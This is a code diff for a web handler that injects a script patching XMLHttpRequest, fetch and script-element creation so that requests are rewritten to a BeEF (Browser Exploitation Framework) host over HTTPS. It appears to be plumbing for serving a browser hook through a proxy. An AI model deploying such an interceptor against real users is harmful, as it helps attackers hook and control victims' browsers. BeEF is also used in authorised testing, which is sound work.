@@ -113,36 +113,69 @@ export default async function handler(req, res) {
   const BEEF_ORIGIN = '${origin}';
   const BEEF_HOST = '${hostname}';
   
-  // Store original XMLHttpRequest methods
-  const originalOpen = XMLHttpRequest.prototype.open;
-  const originalSend = XMLHttpRequest.prototype.send;
-  
-  // Patch XMLHttpRequest.open to rewrite URLs
-  XMLHttpRequest.prototype.open = function(method, url, ...args) {
-    // Convert URL to string and check if it needs fixing
+  // Helper function to rewrite URLs
+  function rewriteUrl(url) {
+    if (!url) return url;
     let fixedUrl = String(url);
     
     // Replace http://beef-host:3000 with https://beef-host
     if (fixedUrl.includes('http://' + BEEF_HOST)) {
       fixedUrl = fixedUrl.replace(/http:\\/\\/[^/]+/, BEEF_ORIGIN);
       console.log('[BeEF Proxy] Rewrote URL:', url, '->', fixedUrl);
+      return fixedUrl;
     }
-    
-    return originalOpen.call(this, method, fixedUrl, ...args);
+    return url;
+  }
+  
+  // 1. Patch XMLHttpRequest.open
+  const originalOpen = XMLHttpRequest.prototype.open;
+  XMLHttpRequest.prototype.open = function(method, url, ...args) {
+    return originalOpen.call(this, method, rewriteUrl(url), ...args);
   };
   
-  // Also patch fetch if BeEF uses it
+  // 2. Patch fetch
   if (window.fetch) {
     const originalFetch = window.fetch;
     window.fetch = function(url, ...args) {
-      let fixedUrl = String(url);
-      if (fixedUrl.includes('http://' + BEEF_HOST)) {
-        fixedUrl = fixedUrl.replace(/http:\\/\\/[^/]+/, BEEF_ORIGIN);
-        console.log('[BeEF Proxy] Rewrote fetch URL:', url, '->', fixedUrl);
-      }
-      return originalFetch.call(this, fixedUrl, ...args);
+      return originalFetch.call(this, rewriteUrl(url), ...args);
     };
   }
+  
+  // 3. CRITICAL: Patch HTMLScriptElement.src setter (for dynamic script tags)
+  const scriptDescriptor = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
+  if (scriptDescriptor && scriptDescriptor.set) {
+    const originalSrcSetter = scriptDescriptor.set;
+    Object.defineProperty(HTMLScriptElement.prototype, 'src', {
+      set: function(value) {
+        const rewritten = rewriteUrl(value);
+        return originalSrcSetter.call(this, rewritten);
+      },
+      get: scriptDescriptor.get,
+      configurable: true,
+      enumerable: true
+    });
+  }
+  
+  // 4. Patch document.createElement to intercept script creation
+  const originalCreateElement = document.createElement;
+  document.createElement = function(tagName, ...args) {
+    const element = originalCreateElement.call(document, tagName, ...args);
+    
+    // If creating a script tag, patch its src attribute
+    if (tagName && tagName.toLowerCase() === 'script') {
+      const originalSetAttribute = element.setAttribute;
+      element.setAttribute = function(name, value) {
+        if (name === 'src') {
+          value = rewriteUrl(value);
+        }
+        return originalSetAttribute.call(this, name, value);
+      };
+    }
+    
+    return element;
+  };
+  
+  console.log('[BeEF Proxy] URL interceptor initialized for:', BEEF_ORIGIN);
 })();
 // === END URL INTERCEPTOR ===
 
